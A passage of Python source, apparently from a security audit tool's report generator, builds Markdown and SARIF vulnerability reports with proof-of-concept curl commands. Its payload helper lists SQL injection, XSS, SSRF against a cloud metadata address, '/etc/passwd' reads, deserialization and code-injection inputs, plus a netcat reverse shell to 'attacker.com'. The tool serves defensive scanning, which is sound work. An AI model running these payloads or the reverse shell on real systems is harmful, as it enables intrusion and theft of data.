                lines.append(f"See `{file_path}:{line_num}`")
        lines.append("")

        # ── Proof of Impact ──
        lines.append(f"**{labels['proof_of_impact']}:**")
        lines.append("")
        poi = lookup_proof_of_impact(primary_vuln, lang=lang) if primary_vuln else ""
        if poi:
            lines.append(poi)
        else:
            if lang == "cn":
                lines.append(
                    "成功利用此漏洞后，攻击者可以绕过安全控制机制，对应用系统的"
                    "机密性、完整性或可用性造成损害。"
                )
            else:
                lines.append(
                    "Successful exploitation of this vulnerability allows an attacker "
                    "to bypass security controls, compromising the confidentiality, "
                    "integrity, or availability of the application."
                )
        lines.append("")

        # ── Remediation ──
        remediation = getattr(f, "remediation", "")
        if remediation:
            lines.append(f"**{labels['remediation']}:**")
            lines.append("")
            lines.append(remediation)
            lines.append("")

        # ── LLM validation cross-reference (if available) ──
        val_verdict = getattr(f, "validation_verdict", "")
        val_conf = getattr(f, "validation_confidence", 0.0)
        if val_verdict and lang == "cn":
            if val_verdict == "confirmed":
                lines.append(f"*🤖 LLM 验证: ✅ confirmed ({val_conf:.0%})*")
            elif val_verdict == "rejected":
                lines.append(f"*🤖 LLM 验证: ❌ rejected ({val_conf:.0%})*")
        elif val_verdict:
            if val_verdict == "confirmed":
                lines.append(f"*🤖 LLM Verification: ✅ confirmed ({val_conf:.0%})*")
            elif val_verdict == "rejected":
                lines.append(f"*🤖 LLM Verification: ❌ rejected ({val_conf:.0%})*")
        if val_verdict:
            lines.append("")

        return lines

    # ── PoC section builder ──────────────────────────────────────────

    def _build_poc_section(
        self,
        finding: Any,
        language: str,
        lang: str = "cn",
    ) -> list[str]:
        """Build the PoC (Proof of Concept) section for a finding.

        Always generates a PoC — uses dynamic verification result if
        available, otherwise generates a hypothetical PoC based on
        vulnerability type and endpoint information.
        """
        labels = _L[lang]
        lines: list[str] = [f"**{labels['poc']}:**", ""]

        # Check if we have a PoC from dynamic verification
        existing_poc = getattr(finding, "poc", "")
        has_dv_poc = bool(existing_poc and existing_poc.strip())

        if has_dv_poc:
            lines.append(labels["poc_verified_disclaimer"])
            lines.append("")
            lines.append("```bash")
            lines.append(existing_poc.strip()[:2000])
            lines.append("```")
            return lines

        # Generate hypothetical PoC
        poc_code, poc_desc = self._generate_hypothetical_poc(finding, language, lang=lang)
        lines.append(labels["poc_disclaimer"])
        lines.append("")
        if poc_desc:
            lines.append(poc_desc)
            lines.append("")
        if poc_code:
            lines.append("```bash")
            lines.append(poc_code)
            lines.append("```")
        return lines

    def _generate_hypothetical_poc(
        self,
        finding: Any,
        language: str,
        lang: str = "cn",
    ) -> tuple[str, str]:
        """Generate a code-analysis-driven PoC for a finding.

        Uses the actual code snippet, source/sink locations, endpoint info,
        and HTTP parameters from the finding to construct a realistic,
        code-specific PoC.  Falls back to vulnerability-type heuristics
        only when code-level data is unavailable.

        Returns:
            ``(poc_code, description)`` tuple.

        """
        cwe_id = getattr(finding, "cwe_id", "")
        category = getattr(finding, "category", "")
        vuln_type = category.split(",")[0].strip() if category else ""
        endpoint = getattr(finding, "endpoint", "")
        http_method = getattr(finding, "http_method", "GET")
        http_params = getattr(finding, "http_params", "")
        file_path = getattr(finding, "file_path", "")
        line_num = getattr(finding, "line", 0)
        code_snippet = getattr(finding, "code_snippet", "")
        source_location = getattr(finding, "source_location", "")
        sink_location = getattr(finding, "sink_location", "")
        desc = getattr(finding, "description", "")

        payload, _payload_desc = _payload_for_vuln(cwe_id, vuln_type)

        # ── Extract variable names from code snippet ──
        var_names = _extract_variable_names(code_snippet)

        # ── Build code-aware PoC description ──
        desc = _build_code_aware_poc_desc(
            finding, payload, var_names, cwe_id, vuln_type, lang=lang,
        )

        # ── Build PoC code ──
        poc_code = _build_concrete_poc(
            endpoint=endpoint,
            http_method=http_method,
            http_params=http_params,
            payload=payload,
            cwe_id=cwe_id,
            vuln_type=vuln_type,
            var_names=var_names,
            code_snippet=code_snippet,
            file_path=file_path,
            line_num=line_num,
            source_location=source_location,
            sink_location=sink_location,
            lang=lang,
        )

        return poc_code, desc

    # ── Exploitation steps ────────────────────────────────────────────

    @staticmethod
    def _build_exploitation_steps(
        finding: Any,
        lang: str = "cn",
    ) -> list[str]:
        """Build exploitation steps for a finding.

        If HTTP endpoint data is available, generates concrete curl/httpie
        commands.  Otherwise, constructs steps from the code-path description
        and vulnerability type — always produces output.
        """
        labels = _L[lang]
        endpoint = getattr(finding, "endpoint", "")
        http_method = getattr(finding, "http_method", "GET")
        http_params = getattr(finding, "http_params", "")
        cwe_id = getattr(finding, "cwe_id", "")
        category = getattr(finding, "category", "")
        primary_vuln = category.split(",")[0].strip() if category else ""

        lines: list[str] = [f"**{labels['exploitation_steps']}:**", ""]

        # Step 1 — craft payload
        payload, payload_desc = _payload_for_vuln(cwe_id, primary_vuln)
        lines.append(f"1. {payload_desc}")

        # Step 2 — send request (with curl if endpoint available)
        if endpoint:
            param_str = ""
            if payload and http_params:
                params = [p.strip() for p in http_params.split(",") if p.strip()]
                if params:
                    param_str = "?" + "&".join(
                        f"{p}={_url_encode_payload(payload)}" for p in params
                    )
            elif payload:
                param_str = f"?param={_url_encode_payload(payload)}"

            lines.append("")
            lines.append(
                f"2. {labels['step_send_request']} `{http_method} {endpoint}{param_str}`"
            )
            lines.append("")
            curl_cmd = f"curl -X {http_method} 'http://<target>{endpoint}{param_str}'"
            if http_method in ("POST", "PUT", "PATCH") and param_str:
                curl_cmd = (
                    f"curl -X {http_method} 'http://<target>{endpoint}' \\\n"
                    f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                    f"  -d '{param_str.lstrip('?')}'"
                )
            lines.append("```bash")
            lines.append(curl_cmd)
            lines.append("```")
        else:
            src_loc = getattr(finding, "source_location", "")
            sink_loc = getattr(finding, "sink_location", "")
            file_path = getattr(finding, "file_path", "")
            line_num = getattr(finding, "line", 0)
            code = getattr(finding, "code_snippet", "")

            lines.append("")
            lines.append(f"2. {labels['step_taint_flow']}:")
            lines.append("")
            loc = src_loc or sink_loc or (f"{file_path}:{line_num}" if file_path else "N/A")
            lines.append(f"   - **{labels['step_location']}:** `{loc}`")
            if code:
                lines.append(f"   - **{labels['step_vuln_code']}:** `{code.strip()[:120]}`")
            if payload:
                lines.append(f"   - **{labels['step_test_payload']}:** `{payload}`")
        lines.append("")

        # Step 3 — verify
        lines.append(f"3. {labels['step_observe']}:")
        verify_items = _get_verify_items(cwe_id, lang=lang)
        for item in verify_items:
            lines.append(f"   - {item}")

        return lines

    # ── Appendices builder ────────────────────────────────────────────

    def _build_appendices(
        self,
        result: ScanResult,
        deep_ctx: dict[str, Any] | None,
        lang: str = "cn",
    ) -> list[str]:
        """Build the appendices section (LLM data, coverage, blind spots)."""
        labels = _L[lang]
        lines: list[str] = []

        lines.append("---")
        lines.append("")
        lines.append(f"# {labels['appendices']}")
        lines.append("")

        is_deep = deep_ctx is not None

        # ── Deep audit appendices ──
        if is_deep:
            assert deep_ctx is not None
            ctx: dict[str, Any] = deep_ctx

            # LLM Hypotheses
            hypotheses = ctx.get("hypotheses", [])
            if hypotheses:
                lines.append(f"## 🤖 {labels['llm_hypotheses']}")
                lines.append("")
                lines.append(
                    f"| # | {labels['category']} | CWE | {labels['severity']} | "
                    f"{labels['ratio']} | {labels['step_location']} | Sink |"
                )
                lines.append("|---|------|-----|--------|--------|----|----|")
                for j, h in enumerate(hypotheses, 1):
                    vt = getattr(h, "vuln_type", "?")
                    cwe = getattr(h, "cwe_id", "")
                    sev_h = getattr(h, "severity", "?")
                    conf_h = getattr(h, "confidence", 0.0)
                    src_h = getattr(h, "source_location", "")[:30]
                    sink_h = getattr(h, "sink_location", "")[:30]
                    lines.append(
                        f"| {j} | {vt} | {cwe} | {sev_h} | {conf_h:.0%} | "
                        f"`{src_h}` | `{sink_h}` |"
                    )
                lines.append("")

            # Dynamic verification (if available)
            dv_results = ctx.get("dynamic_verification_results", [])
            if dv_results:
                lines.append(f"## 🧪 {labels['dynamic_verification']}")
                lines.append("")
                lines.append(
                    f"| # | {labels['category']} | {labels['severity']} | "
                    f"{labels['status']} | {labels['ratio']} |"
                )
                lines.append("|---|----------|--------|----------|--------|")
                for j, dv in enumerate(dv_results, 1):
                    vt = dv.get("vuln_type", "?")
                    sev_dv = dv.get("severity", "?")
                    verdict = dv.get("verdict", "?")
                    uconf = dv.get("updated_confidence", 0.0)
                    v_icon = {
                        "confirmed": "✅",
                        "rejected": "❌",
                        "inconclusive": "⚠️",
                    }.get(verdict, "❓")
                    lines.append(
                        f"| {j} | {vt} | {sev_dv} | {v_icon} {verdict} | {uconf:.0%} |"
                    )

                # PoC snippets from dynamic verification
                for dv in dv_results:
                    poc_code = dv.get("poc_code", "")
                    if poc_code:
                        lines.append("")
                        lines.append(f"### {labels['poc_example']}")
                        lines.append("")
                        lang_name = dv.get("language", "bash")
                        lines.append(f"```{lang_name}")
                        lines.append(poc_code[:2000])
                        lines.append("```")
                lines.append("")

            # Convergence
            conv = ctx.get("convergence")
            if conv is not None:
                lines.append(f"## 🔄 {labels['convergence']}")
                lines.append("")
                lines.append(f"- **{labels['rounds']}**: {getattr(conv, 'round', '?')}")
                lines.append(
                    f"- **{labels['status']}**: "
                    f"{getattr(conv, 'recommendation', 'unknown')}"
                )
                if getattr(conv, "escalate_reason", ""):
                    lines.append(f"- **{labels['reason']}**: {conv.escalate_reason}")
                conv_summary = str(getattr(conv, "summary", ""))
                if conv_summary:
                    lines.append(f"- **{labels['metrics']}**: {conv_summary}")
                lines.append("")

            # Cost
            cost = ctx.get("cost_summary")
            if cost is not None:
                lines.append(f"## 💰 {labels['llm_cost']}")
                lines.append("")
                lines.append(f"| {labels['metrics']} | {labels['count']} |")
                lines.append("|------|----|")
                lines.append(
                    f"| {labels['total_cost']} | ${getattr(cost, 'total_cost', 0.0):.4f} |"
                )
                lines.append(
                    f"| {labels['prompt_tokens']} | {getattr(cost, 'total_input_tokens', 0):,} |"
                )
                lines.append(
                    f"| {labels['completion_tokens']} | "
                    f"{getattr(cost, 'total_output_tokens', 0):,} |"
                )
                lines.append(
                    f"| {labels['scan_duration']} | {ReportGenerator._format_duration(0)} |"
                )
                lines.append("")

            # Phases
            phases = ctx.get("phases_completed", [])
            if phases:
                lines.append(f"## 📋 {labels['phases']}")
                lines.append("")
                for p in phases:
                    lines.append(f"- ✅ {p}")
                lines.append("")

        # ── Coverage (both modes) ──
        coverage = getattr(result, "coverage", None)
        if coverage:
            lines.append(f"## 📈 {labels['coverage']}")
            lines.append("")
            ep_cov = getattr(coverage, "endpoint_coverage_ratio", 0.0)
            sk_cov = getattr(coverage, "sink_coverage_ratio", 0.0)
            lines.append(f"| {labels['metrics']} | {labels['ratio']} |")
            lines.append("|------|--------|")
            lines.append(f"| {labels['endpoint_coverage']} | {ep_cov * 100:.1f}% |")
            lines.append(f"| {labels['sink_coverage']} | {sk_cov * 100:.1f}% |")
            lines.append("")

        # ── Blind spots (both modes) ──
        blind_spots = self._blind_spot_list(result)
        if blind_spots:
            lines.append(f"## ⚠️ {labels['blind_spots']}")
            lines.append("")
            lines.append(labels["blind_spots_desc"])
            lines.append("")
            for bs in blind_spots:
                sev_bs = bs.get("severity", "medium")
                lines.append(
                    f"- **[{sev_bs.upper()}]** {bs.get('location', '?')}: "
                    f"{bs.get('reason', '')}"
                )
                rec = bs.get("recommendation", "")
                if rec:
                    lines.append(f"  → {rec}")
            lines.append("")

        return lines

    # ── SARIF ──────────────────────────────────────────────────────────

    def _to_sarif(
        self,
        result: ScanResult,
        scan_duration_ms: int,
        files_scanned: int,
        language: str,
    ) -> str:
        """Produce a SARIF v2.1.0 report (for GitHub Code Scanning)."""
        findings = getattr(result, "findings", []) or []

        # Build SARIF results
        sarif_results: list[dict[str, Any]] = []
        rules: dict[str, dict[str, Any]] = {}
        rule_index: dict[str, int] = {}

        for i, f in enumerate(findings):
            rid = getattr(f, "rule_id", f"UNKNOWN-{i}")
            if rid not in rule_index:
                rule_index[rid] = len(rule_index)
                rules[rid] = {
                    "id": rid,
                    "shortDescription": {
                        "text": getattr(f, "title", rid),
                    },
                    "help": {
                        "text": getattr(f, "remediation", ""),
                        "markdown": getattr(f, "description", ""),
                    },
                    "properties": {
                        "security-severity": _severity_score(getattr(f, "severity", "medium")),
                    },
                }

            sev = getattr(f, "severity", "medium")
            fpath = getattr(f, "file_path", "")
            line_num = getattr(f, "line", 0)
            code = getattr(f, "code_snippet", "")

            region = {"startLine": line_num} if line_num else {}

            location = {
                "physicalLocation": {
                    "artifactLocation": {
                        "uri": fpath,
                    },
                },
            }
            if region:
                location["physicalLocation"]["region"] = region

            if code:
                location["physicalLocation"]["contextRegion"] = {
                    "snippet": {"text": code},
                }

            sarif_results.append(
                {
                    "ruleId": rid,
                    "ruleIndex": rule_index[rid],
                    "level": _sarif_level(sev),
                    "message": {
                        "text": (
                            f"{getattr(f, 'title', rid)}: "
                            f"{getattr(f, 'description', '')[:200]}"
                        ),
                    },
                    "locations": [location],
                }
            )

        sarif = {
            "$schema": (
                "https://raw.githubusercontent.com/oasis-tcs/"
                "sarif-spec/master/Schemata/sarif-schema-2.1.0.json"
            ),
            "version": "2.1.0",
            "runs": [
                {
                    "tool": {
                        "driver": {
                            "name": "HyqAgent",
                            "version": self._resolve_version(),
                            "informationUri": "https://github.com/hyqagent/hyqagent",
                            "rules": [rules[rid] for rid in sorted(rules)],
                        },
                    },
                    "results": sarif_results,
                },
            ],
        }

        return json.dumps(sarif, ensure_ascii=False, indent=2)

    # ── Helpers ────────────────────────────────────────────────────────

    @staticmethod
    def _finding_to_dict(f: Finding) -> dict[str, Any]:
        """Convert a single Finding to a JSON-serializable dict."""
        d: dict[str, Any] = {
            "id": getattr(f, "id", str(uuid.uuid4())),
            "rule_id": getattr(f, "rule_id", ""),
            "severity": getattr(f, "severity", "medium"),
            "confidence": getattr(f, "confidence", "high"),
            "title": getattr(f, "title", ""),
            "description": getattr(f, "description", ""),
            "file_path": getattr(f, "file_path", ""),
            "line": getattr(f, "line", 0),
            "code_snippet": getattr(f, "code_snippet", ""),
            "category": getattr(f, "category", ""),
            "remediation": getattr(f, "remediation", ""),
            "metadata": getattr(f, "metadata", {}),
        }
        # Enriched fields (deep audit only — omit if empty to keep output lean)
        for key in (
            "cwe_id",
            "cvss_score",
            "cvss_vector",
            "endpoint",
            "http_method",
            "http_params",
            "impact",
            "poc",
            "source_location",
            "sink_location",
        ):
            val = getattr(f, key, "")
            if val:  # skip empty/zero for lean output
                d[key] = val
        # LLM verification fields
        for key in (
            "validation_verdict",
            "validation_confidence",
            "validation_reasoning",
        ):
            val = getattr(f, key, "")
            if val:
                d[key] = val
        return d

    @staticmethod
    def _coverage_dict(result: ScanResult) -> dict[str, Any] | None:
        """Extract coverage data from result, if present."""
        coverage = getattr(result, "coverage", None)
        if coverage is None:
            return None
        return {
            "endpoint_total": getattr(coverage, "endpoint_total", 0),
            "endpoint_analyzed": getattr(coverage, "endpoint_analyzed", 0),
            "endpoint_coverage_ratio": getattr(coverage, "endpoint_coverage_ratio", 0.0),
            "sink_total": getattr(coverage, "sink_total", 0),
            "sink_labeled": getattr(coverage, "sink_labeled", 0),
            "sink_coverage_ratio": getattr(coverage, "sink_coverage_ratio", 0.0),
        }

    @staticmethod
    def _blind_spot_list(result: ScanResult) -> list[dict[str, Any]]:
        """Extract blind spots."""
        coverage = getattr(result, "coverage", None)
        if coverage is None:
            return []
        spots = getattr(coverage, "blind_spots", []) or []
        return [
            {
                "location": getattr(bs, "location", ""),
                "reason": getattr(bs, "reason", ""),
                "recommendation": getattr(bs, "recommendation", ""),
                "severity": getattr(bs, "severity", "medium"),
            }
            for bs in spots
        ]

    @staticmethod
    def _enrich_findings(
        findings: list[Any],
        deep_ctx: dict[str, Any] | None,
        lang: str = "cn",
    ) -> list[Any]:
        """Cross-reference findings with deep audit context.

        For each finding, attach validation verdict, PoC from dynamic
        verification, and matching hypothesis data.  Returns the same
        list — we mutate in place then return for chaining.
        """
        if not deep_ctx or not findings:
            return findings

        # Build lookup maps from deep audit data
        hypotheses = deep_ctx.get("hypotheses", [])
        validations = deep_ctx.get("validations", [])
        dv_results = deep_ctx.get("dynamic_verification_results", [])

        # Map source+sink → hypothesis (for finding enrichment)
        hyp_by_key: dict[str, Any] = {}
        for h in hypotheses:
            key = getattr(h, "stable_key", "")
            if not key:
                src = getattr(h, "source_location", "")
                sink = getattr(h, "sink_location", "")
                vt = getattr(h, "vuln_type", "")
                if src and sink:
                    key = f"{src}|{sink}|{vt}"
            if key:
                hyp_by_key[key] = h

        # Map hypothesis_id → validation result
        val_by_hyp: dict[str, Any] = {}
        for v in validations:
            hid = getattr(v, "hypothesis_id", "")
            if hid:
                val_by_hyp[hid] = v

        # Map vuln_type → dynamic verification (best-effort)
        dv_by_vuln: dict[str, Any] = {}
        for dv in dv_results:
            vt = dv.get("vuln_type", "")
            if vt:
                # Keep the most confident confirmed result
                existing = dv_by_vuln.get(vt)
                if (
                    existing is None
                    or dv.get("updated_confidence", 0)
                    > existing.get("updated_confidence", 0)
                ):
                    dv_by_vuln[vt] = dv

        # Enrich each finding
        for f in findings:
            # Try to match with a hypothesis via source+sink+cwe
            src = getattr(f, "source_location", "")
            sink = getattr(f, "sink_location", "")
            cwe = getattr(f, "cwe_id", "")
            category = getattr(f, "category", "")
            vuln_type = category.split(",")[0].strip() if category else ""

            # Build candidate keys ordered by specificity
            keys_to_try: list[str] = []
            if src and sink and vuln_type:
                keys_to_try.append(f"{src}|{sink}|{vuln_type}")
            if src and sink and cwe:
                keys_to_try.append(f"{src}|{sink}|{cwe}")
            if src and sink:
                # Partial match: any vuln_type at this location
                for k in hyp_by_key:
                    if k.startswith(f"{src}|{sink}|"):
                        keys_to_try.append(k)

            matched_hyp = None
            for k in keys_to_try:
                if k in hyp_by_key:
                    matched_hyp = hyp_by_key[k]
                    break

            if matched_hyp is not None:
                # Attach validation verdict
                hid = getattr(matched_hyp, "id", "")
                val = val_by_hyp.get(hid)
                if val is not None:
                    f.validation_verdict = getattr(val, "verdict", "")
                    f.validation_confidence = getattr(val, "confidence", 0.0)

                # Fill in empty enriched fields from hypothesis
                if not getattr(f, "cwe_id", ""):
                    f.cwe_id = getattr(matched_hyp, "cwe_id", "")
                if not getattr(f, "source_location", ""):
                    f.source_location = getattr(matched_hyp, "source_location", "")
                if not getattr(f, "sink_location", ""):
                    f.sink_location = getattr(matched_hyp, "sink_location", "")

            # Attach PoC from dynamic verification
            vuln_type = vuln_type or getattr(f, "category", "")
            if vuln_type and not getattr(f, "poc", ""):
                dv = dv_by_vuln.get(vuln_type)
                if dv is not None:
                    poc_code = dv.get("poc_code", "")
                    if poc_code:
                        f.poc = poc_code

            # Fill impact from template if empty
            if not getattr(f, "impact", ""):
                vt = vuln_type or ""
                if vt:
                    from hyqagent.report.templates import lookup_impact

                    f.impact = lookup_impact(vt, lang=lang)

        return findings

    @staticmethod
    def _format_duration(ms: int) -> str:
        """Format a duration in milliseconds to a human-readable string."""
        if ms < 1000:
            return f"{ms}ms"
        seconds = ms / 1000
        if seconds < 60:
            return f"{seconds:.1f}s"
        minutes = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{minutes}m {secs}s"

    @staticmethod
    def _resolve_version() -> str:
        """Resolve the installed package version, defaulting to ``0.1.0``."""
        try:
            import importlib.metadata

            return importlib.metadata.version("hyqagent")
        except importlib.metadata.PackageNotFoundError:
            return "0.1.0"

    @staticmethod
    def _timestamp() -> str:
        """ISO-8601 UTC timestamp for the report."""
        from datetime import datetime

        return datetime.now(UTC).isoformat()


# ═══════════════════════════════════════════════════════════════════════════
# Payload helpers
# ═══════════════════════════════════════════════════════════════════════════


def _payload_for_vuln(cwe_id: str, vuln_type: str) -> tuple[str, str]:
    """Return a (payload, description) pair for a given CWE / vuln type."""
    # Try CWE-based matching first (more specific)
    if "CWE-89" in (cwe_id or ""):
        return (
            "1' OR '1'='1' --",
            "构造 SQL 注入 payload：使用 `' OR '1'='1' --` 绕过认证，"
            "或 `' UNION SELECT ... --` 跨表提取数据",
        )
    if "CWE-79" in (cwe_id or ""):
        return (
            "<script>alert(document.cookie)</script>",
            "构造 XSS payload：使用 `<script>alert(document.cookie)</script>` "
            "验证脚本注入，或 `<img src=x onerror=...>` 利用事件处理器执行代码",
        )
    if "CWE-918" in (cwe_id or ""):
        return (
            "http://169.254.169.254/latest/meta-data/",
            "构造 SSRF payload：将目标 URL 参数替换为内部服务地址"
            "（如 AWS IMDS `http://169.254.169.254/latest/meta-data/`）",
        )
    if "CWE-78" in (cwe_id or "") or "CWE-77" in (cwe_id or ""):
        return (
            "; cat /etc/passwd",
            "构造命令注入 payload：使用 `;`, `|`, `&&` 分隔符注入系统命令，"
            "如 `; cat /etc/passwd` 或 `| nc attacker.com 4444 -e /bin/sh`",
        )
    if "CWE-22" in (cwe_id or ""):
        return (
            "../../etc/passwd",
            "构造路径遍历 payload：使用 `../` 序列跳出预期目录，"
            "如 `../../etc/passwd` 读取系统文件",
        )
    if "CWE-502" in (cwe_id or ""):
        return (
            "rO0AB... (base64-encoded serialized object)",
            "构造反序列化 payload：使用 ysoserial 生成恶意序列化对象，"
            "如 `java -jar ysoserial.jar CommonsCollections6 'cmd' | base64`",
        )
    if "CWE-1336" in (cwe_id or ""):
        return (
            "{{7*7}}",
            "构造 SSTI payload：使用 `{{7*7}}` 测试模板注入，"
            "若输出 49 则确认漏洞存在",
        )
    if "CWE-94" in (cwe_id or ""):
        return (
            "__import__('os').system('id')",
            "构造代码注入 payload：注入可执行的表达式或语句，"
            "如 `__import__('os').system('id')`",
        )

    # Fallback: match by vuln_type string
    vt = vuln_type.lower().strip()
    if "sql" in vt:
        return (
            "1' OR '1'='1' --",
            "构造 SQL 注入 payload：使用 OR-based 注入测试查询逻辑漏洞",
        )
    if "xss" in vt:
        return (
            "<script>alert(1)</script>",
            "构造 XSS payload：使用最基本的脚本注入测试输出编码",
        )
    if "ssrf" in vt:
        return (
            "http://localhost:8080/",
            "构造 SSRF payload：将目标 URL 替换为内部地址"
            "（如 localhost 或内网 IP）",
        )
    if "path" in vt or "traversal" in vt:
        return (
            "../../etc/passwd",
            "构造路径遍历 payload：使用 `../` 尝试访问预期外的文件系统路径",
        )
    if "command" in vt or "injection" in vt:
        return (
            "; id",
            "构造命令注入 payload：使用 shell 元字符注入系统命令",
        )

    return ("<malicious input>", "构造针对此漏洞类型的恶意输入")


def _url_encode_payload(payload: str) -> str:
    """Minimal URL-encoding for common payload characters in curl commands."""
    return (
        payload.replace("'", "%27")
        .replace(" ", "%20")
        .replace("<", "%3C")
        .replace(">", "%3E")
        .replace(";", "%3B")
        .replace("|", "%7C")
        .replace("&", "%26")
    )


# ═══════════════════════════════════════════════════════════════════════════
# Code-analysis-driven PoC helpers
# ═══════════════════════════════════════════════════════════════════════════


def _extract_variable_names(code_snippet: str) -> list[str]:
    """Extract likely variable/parameter names from a code snippet.

    Uses simple heuristics: function parameters, variable assignments,
    and string-interpolation patterns.  Returns up to 5 candidates.
    """
    import re

    names: list[str] = []
    # Function parameter patterns: def foo(a, b, c) / function foo(a, b, c) / (String a, int b)
    param_match = re.findall(
        r'(?:def|function)\s+\w+\s*\(([^)]*)\)|'
        r'\((?:String|int|bool|float|var|let|const)\s+(\w+)',
        code_snippet,
    )
    for group in param_match:
        for g in group:
            if g:
                for part in g.split(","):
                    name = part.strip().split(":")[0].strip().split()[-1].strip()
                    if name and name not in ("self", "cls", "this"):
                        names.append(name)

    # Variable assignment: var = value / $var = value
    assigns = re.findall(r'(\$?\w+)\s*[:=]\s*', code_snippet)
    for a in assigns:
        a = a.strip()
        if a not in names and a not in ("self", "cls", "this") and len(a) > 1:
            names.append(a)

    # String interpolation: f"{var}" / "${var}" / + var +
    interp = re.findall(r'\{(\w+)\}|\$\{(\w+)\}|\$(\w+)', code_snippet)
    for group in interp:
        for g in group:
            if g and g not in names and len(g) > 1:
                names.append(g)

    # Deduplicate, limit to 5
    seen: set[str] = set()
    result = []
    for n in names:
        if n.lower() not in seen:
            seen.add(n.lower())
            result.append(n)
    return result[:5]


def _build_code_aware_poc_desc(
    finding: Any,
    payload: str,
    var_names: list[str],
    cwe_id: str,
    vuln_type: str,
    lang: str = "cn",
) -> str:
    """Build a code-aware PoC description that references actual code elements."""
    endpoint = getattr(finding, "endpoint", "")
    http_method = getattr(finding, "http_method", "GET")
    http_params = getattr(finding, "http_params", "")
    file_path = getattr(finding, "file_path", "")
    line_num = getattr(finding, "line", 0)
    code_snippet = getattr(finding, "code_snippet", "")
    source_location = getattr(finding, "source_location", "")
    sink_location = getattr(finding, "sink_location", "")

    parts: list[str] = []

    if lang == "cn":
        # Describe the vulnerable code pattern
        if code_snippet:
            first_line = code_snippet.strip().split("\n")[0][:100]
            parts.append(f"以下代码片段存在安全漏洞（`{file_path}:{line_num}`）：")
            parts.append(f"```\n{first_line}\n```")
            parts.append("")

        # Describe the data flow
        if source_location and sink_location:
            parts.append(
                f"**数据流分析**：用户可控输入从 `{source_location}` 进入，"
                f"未经有效过滤即到达危险汇点 `{sink_location}`。"
            )
        elif source_location:
            parts.append(
                f"**数据流分析**：用户可控输入从 `{source_location}` 进入，"
                f"最终到达危险汇点。"
            )

        # Describe which variable/parameter is vulnerable
        if var_names and http_params:
            param_list = http_params.split(",") if http_params else []
            matching = [v for v in var_names if any(p.strip() == v for p in param_list)]
            if matching:
                parts.append(
                    f"**受影响参数**：`{', '.join(matching)}` — "
                    f"此参数接收用户输入后直接传递给危险操作。"
                )
            else:
                parts.append(
                    f"**相关变量**：`{', '.join(var_names[:3])}` 可能携带未过滤的用户输入。"
                )
        elif var_names:
            parts.append(
                f"**相关变量**：`{', '.join(var_names[:3])}` 可能携带未过滤的用户输入。"
            )

        # PoC command description
        if endpoint:
            parts.append("")
            parts.append(
                f"以下 curl 命令通过向 `{http_method} {endpoint}` 发送 `{payload}` "
                f"来验证漏洞是否可利用："
            )
        else:
            parts.append("")
            parts.append("以下步骤演示了如何构造并发送恶意 payload 触发此漏洞：")
    else:
        # English version
        if code_snippet:
            first_line = code_snippet.strip().split("\n")[0][:100]
            parts.append(f"The following code is vulnerable (`{file_path}:{line_num}`):")
            parts.append(f"```\n{first_line}\n```")
            parts.append("")

        if source_location and sink_location:
            parts.append(
                f"**Data flow**: user-controlled input enters at `{source_location}` "
                f"and reaches the dangerous sink at `{sink_location}` without sanitization."
            )
        elif source_location:
            parts.append(
                f"**Data flow**: user-controlled input enters at `{source_location}` "
                f"and flows to a dangerous sink."
            )

        if var_names and http_params:
            param_list = http_params.split(",") if http_params else []
            matching = [v for v in var_names if any(p.strip() == v for p in param_list)]
            if matching:
                parts.append(
                    f"**Affected parameter(s)**: `{', '.join(matching)}` — "
                    f"this parameter receives user input passed directly to dangerous operations."
                )
            else:
                parts.append(
                    f"**Relevant variable(s)**: `{', '.join(var_names[:3])}` "
                    f"may carry unsanitized user input."
                )
        elif var_names:
            parts.append(
                f"**Relevant variable(s)**: `{', '.join(var_names[:3])}` "
                f"may carry unsanitized user input."
            )

        if endpoint:
            parts.append("")
            parts.append(
                f"The following curl command verifies exploitability by sending "
                f"`{payload}` to `{http_method} {endpoint}`:"
            )
        else:
            parts.append("")
            parts.append(
                "The following steps demonstrate how to craft and deliver "
                "a malicious payload to trigger this vulnerability:"
            )

    return "\n".join(parts)


def _build_concrete_poc(
    endpoint: str,
    http_method: str,
    http_params: str,
    payload: str,
    cwe_id: str,
    vuln_type: str,
    var_names: list[str],
    code_snippet: str,
    file_path: str,
    line_num: int,
    source_location: str,
    sink_location: str,
    lang: str = "cn",
) -> str:
    """Build a concrete, copy-paste-ready curl PoC command.

    Always produces a testable curl command.  Uses real endpoint/parameter
    names when available; otherwise constructs a plausible endpoint from
    the code context (file path, variable names, vulnerability type).
    """
    encoded = _url_encode_payload(payload)

    # ── Determine the request target ──
    target_path = endpoint or _infer_endpoint(file_path, vuln_type, cwe_id)

    # ── Determine HTTP method ──
    method = http_method if http_method else _infer_http_method(vuln_type, cwe_id, code_snippet)

    # ── Determine parameter names ──
    param_names = _resolve_param_names(http_params, var_names, code_snippet, vuln_type)

    # ── Build the curl command ──
    lines: list[str] = []

    # Header comments
    location_info = f"{file_path}:{line_num}" if file_path else "unknown"
    if lang == "cn":
        lines.append(f"# 漏洞位置: {location_info}")
        if source_location and sink_location:
            lines.append(f"# 数据流: {source_location} → {sink_location}")
        lines.append(f"# 漏洞类型: {cwe_id or vuln_type}")
        lines.append(f"# Payload: {payload}")
        lines.append("#")
        lines.append("# === 复制以下命令到终端执行 ===")
    else:
        lines.append(f"# Location: {location_info}")
        if source_location and sink_location:
            lines.append(f"# Data flow: {source_location} → {sink_location}")
        lines.append(f"# Type: {cwe_id or vuln_type}")
        lines.append(f"# Payload: {payload}")
        lines.append("#")
        lines.append("# === Copy the command below to your terminal ===")

    lines.append("")

    if method in ("POST", "PUT", "PATCH"):
        # Build POST/PUT/PATCH with body parameters
        first_param = param_names[0] if param_names else "input"
        other_params = param_names[1:] if len(param_names) > 1 else []

        lines.append(
            f"curl -X {method} 'http://<target>{target_path}' \\\n"
            f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
            f"  -d '{first_param}={encoded}'"
        )
        for other in other_params:
            lines[-1] += f" \\\n  -d '{other}=test'"

        # Add a GET variant for comparison
        lines.append("")
        if lang == "cn":
            lines.append("# 或使用 GET 方式（如果端点同时支持 GET）：")
        else:
            lines.append("# Or as GET (if the endpoint also accepts GET):")
        get_params = "&".join(
            f"{p}={encoded if p == first_param else 'test'}"
            for p in param_names[:3]
        )
        lines.append(f"curl -X GET 'http://<target>{target_path}?{get_params}'")
    else:
        # GET request
        first_param = param_names[0] if param_names else "q"
        get_params = "&".join(
